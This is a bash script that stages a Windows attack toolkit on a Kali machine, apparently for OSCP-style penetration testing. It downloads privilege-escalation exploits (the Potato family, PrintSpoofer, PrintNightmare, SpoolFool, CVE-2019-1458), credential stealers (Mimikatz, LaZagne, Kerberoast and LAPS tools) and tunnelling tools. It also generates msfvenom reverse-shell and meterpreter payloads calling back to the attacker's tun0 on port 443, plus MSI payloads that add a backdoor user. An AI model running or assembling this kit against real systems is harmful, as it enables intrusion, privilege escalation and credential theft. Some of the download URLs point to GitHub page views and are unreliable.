#!/bin/bash -e

# Windows Tools ready to serve in seconds on Kali

# - PowerUp
# - PowerView
# - nc.exe
# - Plink
# - winPEAS
# - Mimikatz
# - powercat.ps1
# - Chisel
# - PrintSpoofer
# - Rubeus
# - Sharphound
# - PsExec (PsTools)
# - Procmon
# - ListDLLs
# - RoguePotato
# - GodPotato
# - JuicyPotato
# - JuicyPotatoNG
# - RottenPotato
# - SharpEfsPotato
# - SweetPotato
# - multi_server.exe
# - upload.ps1
# - met.exe
# - Kerbrute
# - SystemNightmare.bat
# - HiveNightmare
# - Print Spooler LPE (CVE-2021-1675)
# - SpoolFool (CVE-2022-21999)
# - Certify.exe
# - Invoke-Kerberoast.ps1
# - Invoke-RunasCs.ps1
# - SeManageVolumeExploit.exe
# - PrivescCheck.ps1
# - cve-2019-1458.exe
# - JAWS
# - Powerless.bat
# - ADACLScan.ps1
# - PetitPotam.exe
# - LaZagne.exe
# - Get-LAPSPasswords.ps1
# - SessionGopher.ps1
# - Akagi (UACMe)

#sudo apt install -y powersploit peass windows-binaries

rm -rf ~/win
mkdir ~/win
cd ~/win

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
cp /usr/share/windows-resources/binaries/nc.exe .
cp /usr/share/windows-resources/binaries/plink.exe .
cp /usr/share/peass/winpeas/winPEASx64.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 .

wget https://github.com/besimorhino/powercat/blob/master/powercat.ps1

wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_386.gz
gunzip chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_386.gz

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

wget https://download.sysinternals.com/files/PSTools.zip
unzip PSTools.zip
rm -f Eula.txt

wget https://download.sysinternals.com/files/ProcessMonitor.zip
unzip ProcessMonitor.zip
rm -f Eula.txt

wget https://download.sysinternals.com/files/ListDlls.zip
unzip ListDlls.zip
rm -f Eula.txt

wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
unzip RoguePotato.zip

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
unzip JuicyPotatoNG.zip

wget https://github.com/adann0/multi_server/releases/download/v0.0.1/multi_server.exe
wget https://raw.githubusercontent.com/adann0/multi_server/main/upload.ps1

msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe

wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.exe
wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.lib
wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.pdb
wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.exe
wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.exe.config
wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.pdb
wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.exe
wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.exe.config
wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.pdb
wget https://github.com/adann0/oscp-tools/blob/main/bin/Akagi64.exe
wget https://github.com/adann0/oscp-tools/blob/main/bin/Akagi32.exe

wget https://raw.githubusercontent.com/GossiTheDog/SystemNightmare/main/SystemNightmare.bat
wget https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe
wget https://github.com/calebstewart/CVE-2021-1675/raw/main/CVE-2021-1675.ps1
wget https://github.com/ly4k/SpoolFool/raw/main/SpoolFool.exe
wget https://github.com/ly4k/SpoolFool/raw/main/AddUser.dll
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SweetPotato.exe
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe

wget https://github.com/antonioCoco/RunasCs/raw/master/Invoke-RunasCs.ps1
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1
wget https://github.com/rip1s/CVE-2019-1458/raw/master/x64/Release/cve-2019-1458.exe
wget https://github.com/gladiatx0r/Powerless/raw/master/Powerless.bat
wget https://github.com/canix1/ADACLScanner/releases/download/7.9/ADACLScan.ps1
wget https://github.com/topotam/PetitPotam/raw/main/PetitPotam.exe
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
wget https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1

msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi-nouac -o alwe-nouac.msi #No uac format
msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
msfvenom -p windows/x64/shell_reverse_tcp LHOST='tun0' LPORT=443 msi -o reverse_x64.msi
msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 msi -o reverse.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='tun0' LPORT=443 -f exe > meterpreter_x64.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST='tun0' LPORT=443 -f exe > meterpreter.exe

rm -f *.zip *.gz

cd ..
zip -r win.zip win
